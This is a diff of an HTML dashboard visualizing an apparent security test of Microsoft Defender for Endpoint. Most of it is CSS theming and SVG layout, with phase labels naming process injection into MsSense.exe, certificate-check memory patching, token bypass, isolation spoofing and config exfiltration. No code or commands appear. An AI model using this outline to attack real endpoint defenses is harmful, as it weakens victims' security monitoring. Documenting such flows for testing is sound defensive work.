@@ -5,6 +5,92 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MDE Process Injection & API Authentication Bypass - Attack Flow</title>
     <style>
+        /* ═══════════════════════════════════════════════════════════════
+           THEME VARIABLES - OKLch color palette matching ProjectAchilles
+           Supports: data-theme="light|dark", prefers-color-scheme
+           ═══════════════════════════════════════════════════════════════ */
+        :root {
+            /* Light theme (default) */
+            --diagram-bg: oklch(1 0 0);
+            --diagram-bg-gradient-start: oklch(0.985 0 0);
+            --diagram-bg-gradient-end: oklch(0.922 0 0);
+            --diagram-text-primary: oklch(0.145 0 0);
+            --diagram-text-secondary: oklch(0.556 0 0);
+            --diagram-text-muted: oklch(0.708 0 0);
+            --diagram-panel-bg: oklch(1 0 0);
+            --diagram-panel-bg-translucent: oklch(0.985 0 0 / 95%);
+            --diagram-border: oklch(0.922 0 0);
+            --diagram-accent: oklch(0.205 0 0);
+            --diagram-card-bg: oklch(0.97 0 0);
+            --diagram-card-bg-hover: oklch(0.95 0 0);
+            --diagram-overlay-bg: oklch(0 0 0 / 5%);
+            --diagram-code-bg: oklch(0.97 0 0);
+            --diagram-grid-stroke: oklch(0 0 0 / 3%);
+            --diagram-shadow: oklch(0 0 0 / 15%);
+
+            /* Semantic colors (consistent across themes) */
+            --severity-critical: #ff4444;
+            --severity-critical-bg: rgba(255, 68, 68, 0.1);
+            --severity-high: #ff9f43;
+            --severity-high-bg: rgba(255, 159, 67, 0.1);
+            --severity-medium: #ffc107;
+            --severity-medium-bg: rgba(255, 193, 7, 0.1);
+            --severity-info: #4fc3f7;
+            --severity-info-bg: rgba(79, 195, 247, 0.1);
+
+            /* Accent colors */
+            --diagram-accent-red: #ff6b6b;
+            --diagram-accent-red-light: #ff8787;
+            --diagram-accent-blue: #4fc3f7;
+            --diagram-accent-orange: #ff9f43;
+            --diagram-accent-yellow: #ffc107;
+            --diagram-accent-green: #66bb6a;
+            --diagram-accent-purple: #9c27b0;
+        }
+
+        /* Dark theme */
+        [data-theme="dark"],
+        .dark {
+            --diagram-bg: oklch(0.145 0 0);
+            --diagram-bg-gradient-start: oklch(0.1 0.02 265);
+            --diagram-bg-gradient-end: oklch(0.18 0.02 265);
+            --diagram-text-primary: oklch(0.985 0 0);
+            --diagram-text-secondary: oklch(0.708 0 0);
+            --diagram-text-muted: oklch(0.556 0 0);
+            --diagram-panel-bg: oklch(0.12 0.01 265);
+            --diagram-panel-bg-translucent: oklch(0.12 0.01 265 / 95%);
+            --diagram-border: oklch(1 0 0 / 10%);
+            --diagram-accent: oklch(0.922 0 0);
+            --diagram-card-bg: oklch(0.205 0 0);
+            --diagram-card-bg-hover: oklch(0.25 0 0);
+            --diagram-overlay-bg: oklch(0 0 0 / 30%);
+            --diagram-code-bg: oklch(0.1 0.02 265);
+            --diagram-grid-stroke: oklch(1 0 0 / 2%);
+            --diagram-shadow: oklch(0 0 0 / 50%);
+        }
+
+        /* Fallback for prefers-color-scheme when no data-theme is set */
+        @media (prefers-color-scheme: dark) {
+            :root:not([data-theme]) {
+                --diagram-bg: oklch(0.145 0 0);
+                --diagram-bg-gradient-start: oklch(0.1 0.02 265);
+                --diagram-bg-gradient-end: oklch(0.18 0.02 265);
+                --diagram-text-primary: oklch(0.985 0 0);
+                --diagram-text-secondary: oklch(0.708 0 0);
+                --diagram-text-muted: oklch(0.556 0 0);
+                --diagram-panel-bg: oklch(0.12 0.01 265);
+                --diagram-panel-bg-translucent: oklch(0.12 0.01 265 / 95%);
+                --diagram-border: oklch(1 0 0 / 10%);
+                --diagram-accent: oklch(0.922 0 0);
+                --diagram-card-bg: oklch(0.205 0 0);
+                --diagram-card-bg-hover: oklch(0.25 0 0);
+                --diagram-overlay-bg: oklch(0 0 0 / 30%);
+                --diagram-code-bg: oklch(0.1 0.02 265);
+                --diagram-grid-stroke: oklch(1 0 0 / 2%);
+                --diagram-shadow: oklch(0 0 0 / 50%);
+            }
+        }
+
         * {
             margin: 0;
             padding: 0;
@@ -13,21 +99,15 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
-            color: #e0e0e0;
+            background: linear-gradient(135deg, var(--diagram-bg-gradient-start) 0%, var(--diagram-bg-gradient-end) 100%);
+            color: var(--diagram-text-primary);
             min-height: 100vh;
             overflow: hidden;
         }
 
-        /* F0RT1KA Header */
+        /* F0RT1KA Header - Hidden when embedded in browser */
         .framework-header {
-            background: linear-gradient(135deg, rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.6));
-            border-bottom: 1px solid rgba(255, 107, 107, 0.2);
-            padding: 15px 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
+            display: none;
         }
 
         .framework-title {
@@ -35,7 +115,7 @@
             font-weight: 600;
             letter-spacing: 2px;
             text-transform: uppercase;
-            background: linear-gradient(135deg, #ff6b6b, #ff8787);
+            background: linear-gradient(135deg, var(--diagram-accent-red), var(--diagram-accent-red-light));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
@@ -44,13 +124,13 @@
             position: absolute;
             right: 30px;
             font-size: 0.85em;
-            color: #6b7280;
+            color: var(--diagram-text-muted);
             font-style: italic;
         }
 
         .dashboard-container {
             display: flex;
-            height: calc(100vh - 60px);
+            height: 100vh;
             position: relative;
         }
 
@@ -58,27 +138,29 @@
         .attack-flow-panel {
             flex: 1;
             min-width: 60%;
-            padding: 30px;
+            padding: 20px;
             overflow-y: auto;
             position: relative;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
         }
 
+        /* Test title header - Hidden when embedded in browser */
         .header {
-            text-align: center;
-            margin-bottom: 30px;
-            animation: fadeIn 0.8s ease-out;
+            display: none;
         }
 
         .header h1 {
             font-size: 2.2em;
-            background: linear-gradient(135deg, #ff4458, #ff8787);
+            background: linear-gradient(135deg, var(--severity-critical), var(--diagram-accent-red-light));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 10px;
         }
 
         .header p {
-            color: #9ca3af;
+            color: var(--diagram-text-secondary);
             font-size: 1em;
         }
 
@@ -92,10 +174,10 @@
 
         .view-btn {
             padding: 8px 20px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: var(--diagram-overlay-bg);
+            border: 1px solid var(--diagram-border);
             border-radius: 20px;
-            color: #9ca3af;
+            color: var(--diagram-text-secondary);
             cursor: pointer;
             transition: all 0.3s ease;
             font-size: 0.9em;
@@ -103,34 +185,38 @@
 
         .view-btn.active {
             background: rgba(255, 107, 107, 0.1);
-            border-color: #ff6b6b;
-            color: #ff6b6b;
+            border-color: var(--diagram-accent-red);
+            color: var(--diagram-accent-red);
         }
 
         .view-btn:hover {
-            background: rgba(255, 255, 255, 0.08);
-            color: #ffffff;
+            background: var(--diagram-card-bg-hover);
+            color: var(--diagram-text-primary);
         }
 
         /* SVG Attack Flow Container */
         .attack-flow-svg-container {
-            background: rgba(0, 0, 0, 0.3);
+            background: var(--diagram-overlay-bg);
             border-radius: 12px;
-            padding: 20px;
+            padding: 10px;
             position: relative;
-            min-height: 600px;
+            flex: 1;
+            min-height: 0;
+            overflow: hidden;
         }
 
         .attack-flow-svg {
             width: 100%;
-            height: auto;
-            min-height: 800px;
+            height: 100%;
+            display: block;
         }
 
         /* Timeline View (Hidden by default) */
         .timeline-view {
             display: none;
             padding: 20px;
+            overflow-y: auto;
+            flex: 1;
         }
 
         .timeline-view.active {
@@ -142,7 +228,7 @@
             align-items: center;
             padding: 15px;
             margin-bottom: 15px;
-            background: rgba(0, 0, 0, 0.3);
+            background: var(--diagram-overlay-bg);
             border-radius: 8px;
             cursor: pointer;
             transition: all 0.3s ease;
@@ -150,13 +236,13 @@
         }
 
         .timeline-item:hover {
-            background: rgba(255, 255, 255, 0.05);
+            background: var(--diagram-card-bg-hover);
             transform: translateX(5px);
         }
 
         .timeline-item.active {
             background: rgba(255, 107, 107, 0.05);
-            border-left-color: #ff6b6b;
+            border-left-color: var(--diagram-accent-red);
         }
 
         .timeline-number {
@@ -177,26 +263,26 @@
 
         .timeline-title {
             font-size: 1.1em;
-            color: #ffffff;
+            color: var(--diagram-text-primary);
             margin-bottom: 5px;
         }
 
         .timeline-meta {
             font-size: 0.85em;
-            color: #9ca3af;
+            color: var(--diagram-text-secondary);
         }
 
         /* Right Panel - Details (OPAQUE BACKGROUND) */
         .details-panel {
             width: 450px;
-            background: #0f1419;
-            border-left: 1px solid rgba(255, 255, 255, 0.1);
+            background: var(--diagram-panel-bg);
+            border-left: 1px solid var(--diagram-border);
             padding: 30px;
             overflow-y: auto;
             position: relative;
             transform: translateX(100%);
             transition: transform 0.3s ease;
-            box-shadow: -5px 0 20px rgba(0, 0, 0, 0.8);
+            box-shadow: -5px 0 20px var(--diagram-shadow);
         }
 
         .details-panel.active {
@@ -206,7 +292,7 @@
         .details-header {
             margin-bottom: 25px;
             padding-bottom: 20px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            border-bottom: 1px solid var(--diagram-border);
         }
 
         .details-phase-number {
@@ -224,7 +310,7 @@
 
         .details-title {
             font-size: 1.5em;
-            color: #ffffff;
+            color: var(--diagram-text-primary);
             margin-bottom: 10px;
         }
 
@@ -243,24 +329,24 @@
         }
 
         .meta-label {
-            color: #6b7280;
+            color: var(--diagram-text-muted);
         }
 
         .meta-value {
-            color: #d1d5db;
+            color: var(--diagram-text-secondary);
             font-family: 'SF Mono', monospace;
         }
 
         /* MITRE Links Styling */
         .mitre-link {
-            color: #4fc3f7;
+            color: var(--diagram-accent-blue);
             text-decoration: none;
-            border-bottom: 1px dotted #4fc3f7;
+            border-bottom: 1px dotted var(--diagram-accent-blue);
             transition: all 0.2s ease;
         }
 
         .mitre-link:hover {
-            color: #29b6f6;
+            color: var(--severity-info);
             border-bottom-style: solid;
         }
 
@@ -276,27 +362,27 @@
         }
 
         .severity-badge.critical {
-            color: #ff4444;
-            border-color: #ff4444;
-            background: rgba(255, 68, 68, 0.1);
+            color: var(--severity-critical);
+            border-color: var(--severity-critical);
+            background: var(--severity-critical-bg);
         }
 
         .severity-badge.high {
-            color: #ff9f43;
-            border-color: #ff9f43;
-            background: rgba(255, 159, 67, 0.1);
+            color: var(--severity-high);
+            border-color: var(--severity-high);
+            background: var(--severity-high-bg);
         }
 
         .severity-badge.medium {
-            color: #ffc107;
-            border-color: #ffc107;
-            background: rgba(255, 193, 7, 0.1);
+            color: var(--severity-medium);
+            border-color: var(--severity-medium);
+            background: var(--severity-medium-bg);
         }
 
         .severity-badge.info {
-            color: #4fc3f7;
-            border-color: #4fc3f7;
-            background: rgba(79, 195, 247, 0.1);
+            color: var(--severity-info);
+            border-color: var(--severity-info);
+            background: var(--severity-info-bg);
         }
 
         .details-section {
@@ -305,7 +391,7 @@
 
         .section-title {
             font-size: 1.1em;
-            color: #ff6b6b;
+            color: var(--diagram-accent-red);
             margin-bottom: 15px;
             display: flex;
             align-items: center;
@@ -317,8 +403,8 @@
         }
 
         .action-item {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            background: var(--diagram-card-bg);
+            border: 1px solid var(--diagram-border);
             border-radius: 6px;
             padding: 12px;
             margin-bottom: 10px;
@@ -326,7 +412,7 @@
 
         .action-title {
             font-weight: 500;
-            color: #ffffff;
+            color: var(--diagram-text-primary);
             margin-bottom: 8px;
             font-size: 0.95em;
         }
@@ -337,7 +423,7 @@
         }
 
         .action-details li {
-            color: #9ca3af;
+            color: var(--diagram-text-secondary);
             font-size: 0.85em;
             padding: 3px 0;
             padding-left: 15px;
@@ -345,16 +431,16 @@
         }
 
         .action-details li::before {
-            content: '›';
+            content: '>';
             position: absolute;
             left: 0;
-            color: #6b7280;
+            color: var(--diagram-text-muted);
         }
 
         /* Code Preview */
         .code-preview {
-            background: #0a0e27;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: var(--diagram-code-bg);
+            border: 1px solid var(--diagram-border);
             border-radius: 6px;
             padding: 15px;
             margin-top: 15px;
@@ -364,16 +450,16 @@
         }
 
         .code-line {
-            color: #66bb6a;
+            color: var(--diagram-accent-green);
             line-height: 1.5;
         }
 
         .code-comment {
-            color: #6b7280;
+            color: var(--diagram-text-muted);
         }
 
         .code-highlight {
-            color: #ff9f43;
+            color: var(--diagram-accent-orange);
         }
 
         /* Close button for details panel */
@@ -383,7 +469,7 @@
             right: 15px;
             background: none;
             border: none;
-            color: #6b7280;
+            color: var(--diagram-text-muted);
             font-size: 24px;
             cursor: pointer;
             transition: color 0.3s ease;
@@ -391,7 +477,7 @@
         }
 
         .close-details:hover {
-            color: #ff6b6b;
+            color: var(--diagram-accent-red);
         }
 
         /* Mobile responsive */
@@ -446,25 +532,56 @@
             animation: pulse 2s ease-in-out infinite;
         }
 
-        /* Navigation hints */
+        /* Navigation hints - Hidden when embedded */
         .nav-hint {
-            position: absolute;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.7);
-            padding: 10px 20px;
-            border-radius: 20px;
-            font-size: 0.85em;
-            color: #9ca3af;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            animation: fadeIn 1s ease-out 2s both;
+            display: none;
         }
 
         .nav-hint-icon {
-            color: #ff6b6b;
+            color: var(--diagram-accent-red);
+        }
+
+        /* Sidebar toggle button */
+        .sidebar-toggle {
+            position: fixed;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 28px;
+            height: 80px;
+            background: var(--diagram-panel-bg-translucent);
+            border: 1px solid var(--diagram-border);
+            border-right: none;
+            border-radius: 8px 0 0 8px;
+            color: var(--diagram-accent-red);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            z-index: 200;
+            transition: all 0.3s ease;
+        }
+
+        .sidebar-toggle:hover {
+            background: rgba(255, 107, 107, 0.2);
+            width: 32px;
+        }
+
+        .sidebar-toggle .toggle-icon {
+            transition: transform 0.3s ease;
+        }
+
+        .sidebar-toggle.collapsed .toggle-icon {
+            transform: rotate(180deg);
+        }
+
+        .sidebar-toggle.expanded {
+            right: 450px;
+        }
+
+        .details-panel.collapsed {
+            transform: translateX(100%) !important;
         }
 
         /* Stats overlay */
@@ -477,20 +594,55 @@
         }
 
         .stat-mini {
-            background: rgba(0, 0, 0, 0.7);
+            background: var(--diagram-panel-bg-translucent);
             padding: 8px 12px;
             border-radius: 6px;
             font-size: 0.85em;
         }
 
         .stat-mini-value {
-            color: #ff6b6b;
+            color: var(--diagram-accent-red);
             font-weight: bold;
         }
 
         .stat-mini-label {
-            color: #6b7280;
+            color: var(--diagram-text-muted);
             margin-left: 5px;
+        }
+
+        /* SVG Text Color Overrides - CSS cascades over inline attributes */
+        .attack-flow-svg text {
+            fill: var(--diagram-text-primary);
+        }
+
+        .attack-flow-svg text.svg-text-secondary,
+        .attack-flow-svg .component text:not(:first-of-type) {
+            fill: var(--diagram-text-secondary);
+        }
+
+        .attack-flow-svg .svg-title-box text:first-of-type {
+            fill: var(--diagram-accent-red);
+        }
+
+        .attack-flow-svg .svg-timeline text {
+            fill: var(--diagram-text-secondary);
+        }
+
+        /* Progress bar background */
+        .attack-flow-svg .progress-track {
+            fill: var(--diagram-overlay-bg);
+        }
+
+        /* Central title box */
+        .attack-flow-svg .title-box-bg {
+            fill: var(--diagram-panel-bg-translucent);
+            stroke: rgba(255, 107, 107, 0.3);
+        }
+
+        /* Legend box */
+        .attack-flow-svg .legend-box {
+            fill: var(--diagram-panel-bg-translucent);
+            stroke: rgba(255, 107, 107, 0.3);
         }
     </style>
 </head>
@@ -516,7 +668,7 @@
 
             <!-- Attack Flow View -->
             <div class="attack-flow-svg-container" id="attackFlowView">
-                <svg class="attack-flow-svg" viewBox="0 0 1400 900" xmlns="http://www.w3.org/2000/svg">
+                <svg class="attack-flow-svg" viewBox="0 0 1400 750" preserveAspectRatio="xMidYMid meet" xmlns="http://www.w3.org/2000/svg">
                     <defs>
                         <!-- Gradient Definitions -->
                         <linearGradient id="redGradient" x1="0%" y1="0%" x2="100%" y2="100%">
@@ -556,141 +708,205 @@
                     </defs>
 
                     <!-- Background -->
-                    <rect width="1400" height="900" fill="url(#grid)" />
+                    <rect width="1400" height="750" fill="url(#grid)" />
 
+                    <!-- Central Title -->
+                    <g class="svg-title-box">
+                        <rect class="title-box-bg" x="550" y="20" width="300" height="50" rx="8"/>
+                        <text x="700" y="42" text-anchor="middle" font-size="16" font-weight="bold">MDE Attack Flow</text>
+                        <text class="svg-text-secondary" x="700" y="60" text-anchor="middle" font-size="11">11 Phases - Click for Details</text>
+                    </g>
+
+                    <!-- Detection Legend -->
+                    <g transform="translate(40, 25)">
+                        <rect class="legend-box" x="0" y="0" width="180" height="100" rx="6"/>
+                        <text x="10" y="20" font-size="12" font-weight="bold">Detection Points:</text>
+                        <circle cx="20" cy="40" r="5" fill="#ff4444"/>
+                        <text class="svg-text-secondary" x="35" y="45" font-size="10">Critical Phase</text>
+                        <circle cx="20" cy="60" r="5" fill="#ff9f43"/>
+                        <text class="svg-text-secondary" x="35" y="65" font-size="10">High Priority</text>
+                        <circle cx="20" cy="80" r="5" fill="#4fc3f7"/>
+                        <text class="svg-text-secondary" x="35" y="85" font-size="10">Network/API</text>
+                    </g>
+
+                    <!-- ROW 1: Phases 1, 2, 3 (Y=130) -->
                     <!-- Phase 1: Prerequisites -->
                     <g class="component" data-phase="1" onclick="showPhaseDetails(1)">
-                        <rect class="component-box" x="50" y="400" width="180" height="90" rx="8"
+                        <rect class="component-box" x="50" y="130" width="160" height="85" rx="8"
                               fill="url(#yellowGradient)" stroke="#ffc107" stroke-width="1" opacity="0.2"/>
-                        <text x="140" y="435" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Prerequisites</text>
-                        <text x="140" y="455" text-anchor="middle" fill="#9ca3af" font-size="11">Environment</text>
-                        <text x="140" y="470" text-anchor="middle" fill="#9ca3af" font-size="11">Validation</text>
+                        <text x="130" y="160" text-anchor="middle" font-size="13" font-weight="bold">1. Prerequisites</text>
+                        <text x="130" y="180" text-anchor="middle" font-size="10">Environment</text>
+                        <text x="130" y="195" text-anchor="middle" font-size="10">Validation</text>
                     </g>
 
                     <!-- Phase 2: Process Discovery -->
                     <g class="component" data-phase="2" onclick="showPhaseDetails(2)">
-                        <rect class="component-box" x="280" y="250" width="180" height="90" rx="8"
+                        <rect class="component-box" x="250" y="130" width="160" height="85" rx="8"
                               fill="url(#orangeGradient)" stroke="#ff9f43" stroke-width="1" opacity="0.2"/>
-                        <text x="370" y="285" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Process Discovery</text>
-                        <text x="370" y="305" text-anchor="middle" fill="#9ca3af" font-size="11">MsSense.exe</text>
-                        <text x="370" y="320" text-anchor="middle" fill="#9ca3af" font-size="11">Enumeration</text>
+                        <text x="330" y="160" text-anchor="middle" font-size="13" font-weight="bold">2. Process Discovery</text>
+                        <text x="330" y="180" text-anchor="middle" font-size="10">MsSense.exe</text>
+                        <text x="330" y="195" text-anchor="middle" font-size="10">Enumeration</text>
                     </g>
 
-                    <!-- Phase 3: Handle Acquisition (CRITICAL) -->
+                    <!-- Phase 3: Handle Acquisition -->
                     <g class="component" data-phase="3" onclick="showPhaseDetails(3)">
-                        <rect class="component-box" x="280" y="550" width="180" height="90" rx="8"
+                        <rect class="component-box" x="450" y="130" width="160" height="85" rx="8"
                               fill="url(#redGradient)" stroke="#ff6b6b" stroke-width="1" opacity="0.2"/>
-                        <text x="370" y="580" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Handle Acquisition</text>
-                        <text x="370" y="600" text-anchor="middle" fill="#9ca3af" font-size="11">CRITICAL PHASE</text>
-                        <text x="370" y="615" text-anchor="middle" fill="#9ca3af" font-size="11">Process Injection</text>
+                        <text x="530" y="160" text-anchor="middle" font-size="13" font-weight="bold">3. Handle Acq.</text>
+                        <text x="530" y="180" text-anchor="middle" font-size="10">CRITICAL</text>
+                        <text x="530" y="195" text-anchor="middle" font-size="10">Process Injection</text>
                     </g>
 
+                    <!-- ROW 2: Phases 4, 5, 6 (Y=260) -->
                     <!-- Phase 4: Module Enumeration -->
                     <g class="component" data-phase="4" onclick="showPhaseDetails(4)">
-                        <rect class="component-box" x="510" y="150" width="180" height="90" rx="8"
+                        <rect class="component-box" x="50" y="260" width="160" height="85" rx="8"
                               fill="url(#orangeGradient)" stroke="#ff9f43" stroke-width="1" opacity="0.2"/>
-                        <text x="600" y="185" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Module Enum</text>
-                        <text x="600" y="205" text-anchor="middle" fill="#9ca3af" font-size="11">CRYPT32.dll</text>
-                        <text x="600" y="220" text-anchor="middle" fill="#9ca3af" font-size="11">Targeting</text>
+                        <text x="130" y="290" text-anchor="middle" font-size="13" font-weight="bold">4. Module Enum</text>
+                        <text x="130" y="310" text-anchor="middle" font-size="10">CRYPT32.dll</text>
+                        <text x="130" y="325" text-anchor="middle" font-size="10">Targeting</text>
                     </g>
 
                     <!-- Phase 5: Memory Patching -->
                     <g class="component" data-phase="5" onclick="showPhaseDetails(5)">
-                        <rect class="component-box" x="510" y="650" width="180" height="90" rx="8"
+                        <rect class="component-box" x="250" y="260" width="160" height="85" rx="8"
                               fill="url(#redGradient)" stroke="#ff6b6b" stroke-width="1" opacity="0.2"/>
-                        <text x="600" y="680" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Memory Patching</text>
-                        <text x="600" y="700" text-anchor="middle" fill="#9ca3af" font-size="11">Cert Bypass</text>
-                        <text x="600" y="715" text-anchor="middle" fill="#9ca3af" font-size="11">Watchdog Active</text>
+                        <text x="330" y="290" text-anchor="middle" font-size="13" font-weight="bold">5. Memory Patch</text>
+                        <text x="330" y="310" text-anchor="middle" font-size="10">Cert Bypass</text>
+                        <text x="330" y="325" text-anchor="middle" font-size="10">Watchdog Active</text>
                     </g>
 
                     <!-- Phase 6: Network Proxy -->
                     <g class="component" data-phase="6" onclick="showPhaseDetails(6)">
-                        <rect class="component-box" x="740" y="250" width="180" height="90" rx="8"
+                        <rect class="component-box" x="450" y="260" width="160" height="85" rx="8"
                               fill="url(#blueGradient)" stroke="#4fc3f7" stroke-width="1" opacity="0.2"/>
-                        <text x="830" y="285" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Proxy Config</text>
-                        <text x="830" y="305" text-anchor="middle" fill="#9ca3af" font-size="11">Network</text>
-                        <text x="830" y="320" text-anchor="middle" fill="#9ca3af" font-size="11">Interception</text>
+                        <text x="530" y="290" text-anchor="middle" font-size="13" font-weight="bold">6. Proxy Config</text>
+                        <text x="530" y="310" text-anchor="middle" font-size="10">Network</text>
+                        <text x="530" y="325" text-anchor="middle" font-size="10">Interception</text>
                     </g>
 
+                    <!-- ROW 3: Phases 7, 8 (Y=390) -->
                     <!-- Phase 7: API Command Interception -->
                     <g class="component" data-phase="7" onclick="showPhaseDetails(7)">
-                        <rect class="component-box" x="740" y="550" width="180" height="90" rx="8"
+                        <rect class="component-box" x="50" y="390" width="160" height="85" rx="8"
                               fill="url(#redGradient)" stroke="#ff6b6b" stroke-width="1" opacity="0.2"/>
-                        <text x="830" y="580" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">API Interception</text>
-                        <text x="830" y="600" text-anchor="middle" fill="#9ca3af" font-size="11">Race Condition</text>
-                        <text x="830" y="615" text-anchor="middle" fill="#9ca3af" font-size="11">Command Theft</text>
+                        <text x="130" y="420" text-anchor="middle" font-size="13" font-weight="bold">7. API Intercept</text>
+                        <text x="130" y="440" text-anchor="middle" font-size="10">Race Condition</text>
+                        <text x="130" y="455" text-anchor="middle" font-size="10">Command Theft</text>
                     </g>
 
                     <!-- Phase 8: CloudLR Token -->
                     <g class="component" data-phase="8" onclick="showPhaseDetails(8)">
-                        <rect class="component-box" x="970" y="150" width="180" height="90" rx="8"
+                        <rect class="component-box" x="250" y="390" width="160" height="85" rx="8"
                               fill="url(#purpleGradient)" stroke="#9c27b0" stroke-width="1" opacity="0.2"/>
-                        <text x="1060" y="185" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">CloudLR Token</text>
-                        <text x="1060" y="205" text-anchor="middle" fill="#9ca3af" font-size="11">Token Gen</text>
-                        <text x="1060" y="220" text-anchor="middle" fill="#9ca3af" font-size="11">Bypass</text>
+                        <text x="330" y="420" text-anchor="middle" font-size="13" font-weight="bold">8. CloudLR Token</text>
+                        <text x="330" y="440" text-anchor="middle" font-size="10">Token Gen</text>
+                        <text x="330" y="455" text-anchor="middle" font-size="10">Bypass</text>
                     </g>
 
+                    <!-- ROW 4: Phases 9, 10, 11 (Y=520) -->
                     <!-- Phase 9: Isolation Spoofing -->
                     <g class="component" data-phase="9" onclick="showPhaseDetails(9)">
-                        <rect class="component-box" x="970" y="400" width="180" height="90" rx="8"
+                        <rect class="component-box" x="50" y="520" width="160" height="85" rx="8"
                               fill="url(#orangeGradient)" stroke="#ff9f43" stroke-width="1" opacity="0.2"/>
-                        <text x="1060" y="435" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Isolation Spoof</text>
-                        <text x="1060" y="455" text-anchor="middle" fill="#9ca3af" font-size="11">Command</text>
-                        <text x="1060" y="470" text-anchor="middle" fill="#9ca3af" font-size="11">Spoofing</text>
+                        <text x="130" y="550" text-anchor="middle" font-size="13" font-weight="bold">9. Isolation Spoof</text>
+                        <text x="130" y="570" text-anchor="middle" font-size="10">Command</text>
+                        <text x="130" y="585" text-anchor="middle" font-size="10">Spoofing</text>
                     </g>
 
                     <!-- Phase 10: Config Exfiltration -->
                     <g class="component" data-phase="10" onclick="showPhaseDetails(10)">
-                        <rect class="component-box" x="970" y="650" width="180" height="90" rx="8"
+                        <rect class="component-box" x="250" y="520" width="160" height="85" rx="8"
                               fill="url(#redGradient)" stroke="#ff6b6b" stroke-width="1" opacity="0.2"/>
-                        <text x="1060" y="680" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Config Exfiltration</text>
-                        <text x="1060" y="700" text-anchor="middle" fill="#9ca3af" font-size="11">8MB Download</text>
-                        <text x="1060" y="715" text-anchor="middle" fill="#9ca3af" font-size="11">Policy Theft</text>
+                        <text x="330" y="550" text-anchor="middle" font-size="13" font-weight="bold">10. Config Exfil</text>
+                        <text x="330" y="570" text-anchor="middle" font-size="10">8MB Download</text>
+                        <text x="330" y="585" text-anchor="middle" font-size="10">Policy Theft</text>
                     </g>
 
                     <!-- Phase 11: Final Evaluation -->
                     <g class="component" data-phase="11" onclick="showPhaseDetails(11)">
-                        <rect class="component-box" x="1200" y="400" width="180" height="90" rx="8"
+                        <rect class="component-box" x="450" y="520" width="160" height="85" rx="8"
                               fill="url(#blueGradient)" stroke="#4fc3f7" stroke-width="1" opacity="0.2"/>
-                        <text x="1290" y="435" text-anchor="middle" fill="#ffffff" font-size="14" font-weight="bold">Final Evaluation</text>
-                        <text x="1290" y="455" text-anchor="middle" fill="#9ca3af" font-size="11">Exit Code</text>
-                        <text x="1290" y="470" text-anchor="middle" fill="#9ca3af" font-size="11">Logic</text>
+                        <text x="530" y="550" text-anchor="middle" font-size="13" font-weight="bold">11. Evaluation</text>
+                        <text x="530" y="570" text-anchor="middle" font-size="10">Exit Code</text>
+                        <text x="530" y="585" text-anchor="middle" font-size="10">Logic</text>
                     </g>
 
-                    <!-- Flow Arrows -->
-                    <path d="M 230 445 L 280 295" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
-                    <path d="M 230 445 L 280 595" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
-                    <path d="M 460 295 L 510 195" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
-                    <path d="M 460 595 L 510 695" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
-                    <path d="M 690 195 L 740 295" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
-                    <path d="M 690 695 L 740 595" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
-                    <path d="M 920 295 L 970 195" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
-                    <path d="M 920 295 L 970 445" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
-                    <path d="M 920 595 L 970 695" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
-                    <path d="M 1150 195 L 1200 445" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
-                    <path d="M 1150 445 L 1200 445" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
-                    <path d="M 1150 695 L 1200 445" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <!-- Flow Arrows - Row 1 -->
+                    <path d="M 210 172 L 250 172" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
+                    <path d="M 410 172 L 450 172" stroke="#ff6b6b" stroke-width="2" fill="none" marker-end="url(#arrowhead)" opacity="0.5"/>
 
-                    <!-- Central Title -->
-                    <rect x="550" y="30" width="300" height="50" rx="8" fill="rgba(0,0,0,0.5)" stroke="rgba(255,107,107,0.3)"/>
